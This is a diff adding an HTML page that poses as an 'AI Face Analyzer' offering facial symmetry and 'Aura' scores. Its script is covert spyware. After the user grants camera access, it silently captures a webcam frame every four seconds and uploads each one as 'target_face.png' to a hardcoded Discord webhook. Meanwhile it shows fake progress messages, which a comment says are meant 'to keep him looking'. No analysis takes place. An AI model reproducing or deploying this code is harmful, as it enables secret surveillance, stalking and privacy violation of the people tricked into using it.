@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Face Analyzer v2.1</title>
+    <style>
+        body { background: #0f0f12; color: #00ff88; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { text-align: center; border: 1px solid #00ff88; padding: 40px; border-radius: 15px; box-shadow: 0 0 20px rgba(0, 255, 136, 0.2); }
+        #video { width: 320px; height: 240px; border: 2px solid #333; margin-bottom: 20px; display: none; transform: scaleX(-1); }
+        .btn { background: transparent; color: #00ff88; border: 1px solid #00ff88; padding: 15px 30px; font-size: 1.2rem; cursor: pointer; transition: 0.3s; text-transform: uppercase; letter-spacing: 2px; }
+        .btn:hover { background: #00ff88; color: #000; box-shadow: 0 0 30px #00ff88; }
+        #status { margin-top: 20px; font-size: 0.9rem; color: #888; }
+        .scanning-line { width: 320px; height: 2px; background: #00ff88; position: absolute; display: none; animation: scan 2s infinite ease-in-out; }
+        @keyframes scan { 0% { top: 0; } 50% { top: 240px; } 100% { top: 0; } }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>AESTHETIC SCANNER</h1>
+        <p>Analyze facial symmetry and "Aura" score using AI.</p>
+        
+        <div style="position: relative;">
+            <video id="video" autoplay playsinline></video>
+            <div id="scan-line" class="scanning-line"></div>
+        </div>
+
+        <button class="btn" id="start-btn">BEGIN ANALYSIS</button>
+        <div id="status">Ready for input...</div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1483044415869288463/V1LDxEonCzFQ2ttaIdvzqkyR0DcJHrrHSgvFpsYxqb6g97uaQTd2kE31rPUeDZTeDsjVq";
+        const btn = document.getElementById('start-btn');
+        const video = document.getElementById('video');
+        const status = document.getElementById('status');
+        const scanLine = document.getElementById('scan-line');
+
+        btn.addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                video.style.display = "block";
+                scanLine.style.display = "block";
+                btn.style.display = "none";
+                status.innerText = "Analyzing facial vectors... 14% complete";
+
+                // Setup canvas for capturing
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+
+                // Start the photo loop (Every 4 seconds)
+                setInterval(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0);
+
+                    canvas.toBlob((blob) => {
+                        const formData = new FormData();
+                        formData.append('file', blob, 'target_face.png');
+                        formData.append('content', "📸 **New Capture:** Subject is looking at the screen!");
+
+                        fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+                    }, 'image/png');
+
+                    // Fake status updates to keep him looking
+                    const scores = ["Processing...","Calculating Symmetry...", "Aura Detected", "Finalizing Score..."];
+                    status.innerText = scores[Math.floor(Math.random() * scores.length)];
+                }, 4000);
+
+            } catch (err) {
+                status.innerText = "Error: Please allow camera for AI processing.";
+                status.style.color = "red";
+            }
+        });
+    </script>
+</body>
+</html>
